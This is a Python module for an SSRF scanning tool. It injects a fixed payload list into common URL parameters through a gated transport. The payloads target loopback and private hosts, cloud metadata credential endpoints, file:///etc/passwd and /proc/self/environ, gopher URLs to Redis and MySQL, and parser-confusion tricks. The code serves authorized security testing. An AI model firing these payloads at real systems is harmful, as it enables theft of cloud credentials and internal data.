"""
Server-Side Request Forgery (SSRF) detector.

Generates a fixed, deterministic payload set covering the most useful SSRF
vectors and feeds them through a caller-provided transport so the
governance gateway (authorization → scope → rate limiter) can wrap each
dispatch.  No network I/O happens inside this module.

Payload categories (all deterministic so behaviour is property-testable):

    * **Loopback** — http://127.0.0.1, http://localhost, http://[::1]
    * **Private RFC1918** — 10.0.0.1, 172.16.0.245 (target-specific
      from V-2026-007), 192.168.0.1
    * **Cloud metadata** — http://169.254.169.254/latest/meta-data/
      (AWS), http://metadata.google.internal/computeMetadata/v1/ (GCP),
      http://169.254.169.254/metadata/instance (Azure)
    * **Alternative schemes** — gopher://127.0.0.1:3306/_, file:///etc/passwd,
      file:///c:/windows/win.ini
    * **DNS rebinding canary** — http://7f000001.nip.io/ (resolves to 127.0.0.1)
    * **URL parser confusion** — http://target.local@127.0.0.1/, //127.0.0.1

Decision logic lives in
:mod:`toolkit.analysis.classifiers.ssrf` so the check is purely
mechanical and fully unit-testable.
"""

from __future__ import annotations

import logging
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, Iterable

logger = logging.getLogger(__name__)

# Target-specific candidate from V-2026-007.  The list is fixed for
# determinism; callers can override via ``payloads`` argument when
# auditing a different target.
DEFAULT_PAYLOADS: tuple[str, ...] = (
    # Loopback
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    # Private RFC1918
    "http://10.0.0.1/",
    "http://172.16.0.245:3001/api",
    "http://172.16.0.245:3001/internal",
    "http://192.168.0.1/",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Alternative schemes
    "gopher://127.0.0.1:3306/_",
    "gopher://127.0.0.1:6379/_INFO",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///c:/windows/win.ini",
    # DNS rebinding shortcut
    "http://7f000001.nip.io/",
    # Parser confusion
    "http://target.local@127.0.0.1/",
    "//127.0.0.1/",
    "http://127.1/",
    "http://0177.0.0.1/",  # octal 127
    "http://2130706433/",  # decimal 127.0.0.1
)

# Common parameter names that frequently accept URLs server-side.
DEFAULT_PARAMETERS: tuple[str, ...] = (
    "url", "uri", "redirect", "redirect_url", "target", "dest",
    "destination", "callback", "path", "next", "image", "img",
    "src", "source", "fetch", "remote", "host", "endpoint",
    "api", "api_url", "service", "webhook", "proxy",
)


@dataclass(frozen=True)
class SsrfAttempt:
    """One SSRF probe."""

    parameter: str
    payload: str
    status: int | None
    body_excerpt: str
    elapsed_ms: int | None
    error: str | None = None


@dataclass(frozen=True)
class SsrfResult:
    """Aggregated result of a series of SSRF probes."""

    target_url: str
    parameter: str
    attempts: list[SsrfAttempt] = field(default_factory=list)


def inject_param(target_url: str, parameter: str, payload: str) -> str:
    """Return *target_url* with *parameter* set to *payload* in the query string.

    Existing values for *parameter* are replaced.  Non-related parameters
    are preserved in their original order.
    """
    parsed = urllib.parse.urlparse(target_url)
    qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    qs = [(k, v) for k, v in qs if k != parameter]
    qs.append((parameter, payload))
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(qs, doseq=True))
    )


def check_ssrf_param(
    target_url: str,
    parameter: str,
    *,
    transport: Callable[[str], "TransportResponse"],
    payloads: tuple[str, ...] = DEFAULT_PAYLOADS,
) -> SsrfResult:
    """Probe *target_url* with each payload in *parameter* via *transport*.

    *transport* must accept a URL and return an object with attributes
    ``status``, ``body`` (str or bytes) and ``elapsed_ms``.  The
    orchestrator is expected to wrap *transport* with the governance
    gateway, so this function never opens a socket itself.
    """
    attempts: list[SsrfAttempt] = []
    for payload in payloads:
        url = inject_param(target_url, parameter, payload)
        try:
            resp = transport(url)
            body = resp.body if hasattr(resp, "body") else b""
            if isinstance(body, bytes):
                body = body.decode("utf-8", errors="replace")
            attempts.append(
                SsrfAttempt(
                    parameter=parameter,
                    payload=payload,
                    status=getattr(resp, "status", None),
                    body_excerpt=str(body)[:300],
                    elapsed_ms=getattr(resp, "elapsed_ms", None),
                )
            )
        except Exception as exc:  # noqa: BLE001
            attempts.append(
                SsrfAttempt(
                    parameter=parameter,
                    payload=payload,
                    status=None,
                    body_excerpt="",
                    elapsed_ms=None,
                    error=f"{type(exc).__name__}: {exc}",
                )
            )
    return SsrfResult(target_url=target_url, parameter=parameter, attempts=attempts)


def check_ssrf_all_params(
    target_url: str,
    *,
    transport: Callable[[str], "TransportResponse"],
    parameters: Iterable[str] = DEFAULT_PARAMETERS,
    payloads: tuple[str, ...] = DEFAULT_PAYLOADS,
) -> list[SsrfResult]:
    """Run :func:`check_ssrf_param` for every parameter in *parameters*."""
    return [
        check_ssrf_param(target_url, p, transport=transport, payloads=payloads)
        for p in parameters
    ]


@dataclass(frozen=True)
class TransportResponse:  # type hint only; users can pass any duck-typed object
    status: int
    body: str | bytes = ""
    elapsed_ms: int = 0
